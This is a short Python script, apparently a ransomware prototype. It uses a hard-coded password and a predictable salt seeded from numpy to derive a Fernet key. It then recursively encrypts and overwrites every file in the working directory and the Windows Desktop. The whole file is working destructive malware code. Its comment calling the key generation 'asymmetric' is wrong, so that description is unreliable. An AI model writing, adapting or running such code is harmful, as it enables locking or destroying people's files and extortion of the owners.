import pathlib
import secrets
import os
import base64
import getpass
import random
import numpy

import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt


# asymmetric key generation
def key_gen(password):
    numpy.random.seed(ord(password[0]))
    new_salt = numpy.random.bytes(16)
    kdf = Scrypt(salt=new_salt, length=32, n=2**14, r=8, p=1)
    new_key = kdf.derive(password.encode())
    return base64.urlsafe_b64encode(new_key)


def encrypt_file(filename, key):
    fer = Fernet(key)
    with open(filename, "rb") as file:
        data = file.read()
    
    encrypted_data = fer.encrypt(data)
    # change filename (later)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def encrypt_dir(path, key):
    for child in pathlib.Path(path).glob("*"):
        if child.is_file():
            if (os.path.basename(__file__) != child.name):
                print(f"[*] Encrypting {child}")
                encrypt_file(child, key)
        elif child.is_dir():
            encrypt_dir(child, key)


def main():
    password = "password"
    t_key = key_gen(password)
    cwd = os.getcwd()
    encrypt_dir(cwd, t_key)
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    encrypt_dir(desktop, t_key)



if __name__ == '__main__':
    main()
